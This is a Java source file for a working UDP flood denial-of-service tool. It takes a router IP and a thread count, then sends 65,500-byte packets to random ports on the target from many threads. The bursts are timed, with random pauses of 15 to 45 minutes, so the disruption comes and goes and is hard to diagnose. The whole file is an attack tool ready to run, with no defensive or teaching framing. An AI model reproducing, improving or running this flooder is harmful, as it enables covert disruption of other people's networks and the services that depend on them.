package by.pavel;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.Random;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class dos {

  static final AtomicBoolean isRunning = new AtomicBoolean(true);
  static Integer intervalMin = 15;
  static Integer intervalMax = 45;
  static Integer duration = 60;
  static Integer spread = 30;
  static final Random random = new Random();

  public static void main(String[] args) {
    if (args.length < 2) {
      System.out.println("Usage: java dos {router_ip} {num_threads} " +
              "[start_immediately = 1] [interval_min=15 min] [interval_max=45] [duration = 60 sec] [spread = 30 sec]");
      return;
    }
    if (args.length > 2) {
      isRunning.set(Integer.parseInt(args[2]) == 0);
    }
    if (args.length > 3) {
      intervalMin = Integer.parseInt(args[3]);
      assert intervalMin > 0;
    }
    if (args.length > 4) {
      intervalMax = Integer.parseInt(args[4]);
    }
    if (args.length > 5) {
      duration = Integer.parseInt(args[5]);
      assert duration > 0;
    }
    if (args.length > 6) {
      spread = Integer.parseInt(args[6]);
      assert (spread < duration / 2);
      assert (spread >= 0);
    }

    var timer = new Thread(() -> {
      while (true) {
        if (isRunning.compareAndSet(true, false)) {
          try {
            System.out.println("Stopped");
            TimeUnit.MINUTES.sleep(intervalMin + random.nextInt(intervalMax - intervalMin));
          } catch (InterruptedException e) {
            e.printStackTrace();
          }
        }
        if (isRunning.compareAndSet(false, true)) {
          try {
            System.out.println("Running");
            TimeUnit.SECONDS.sleep(duration + ((spread > 0) ? random.nextInt(spread * 2) - spread : 0));
          } catch (InterruptedException e) {
            e.printStackTrace();
          }
        }
      }
    });
    timer.start();

    System.out.println("Router ip: " + args[0]);
    System.out.println("Threads: " + args[1]);
    System.out.println("Running: " + isRunning.get());
    System.out.println("Interval Min: " + intervalMin + " min");
    System.out.println("Interval Max: " + intervalMax + " min");
    System.out.println("Duration: " + duration + " sec");
    System.out.println("Spread: " + spread + " sec");

    for (int i = 0; i < Integer.parseInt(args[1]); i++) {
      var data = new byte[65500];
      var random = new Random();
      var worker = new Thread(() -> {
        while (true) {
          if (isRunning.get()) {
            try {
              var datagramSocket = new DatagramSocket();
              while (isRunning.get()) {
                datagramSocket.send(new DatagramPacket(data, 65500,
                        InetAddress.getByName(args[0]), random.nextInt(65500) + 1));
              }
            } catch (Exception e) {
              e.printStackTrace();
            }
          } else {
            try {
              TimeUnit.SECONDS.sleep(1);
            } catch (InterruptedException e) {
              e.printStackTrace();
            }
          }
        }
      });
      worker.setDaemon(true);
      worker.start();
    }
  }
}
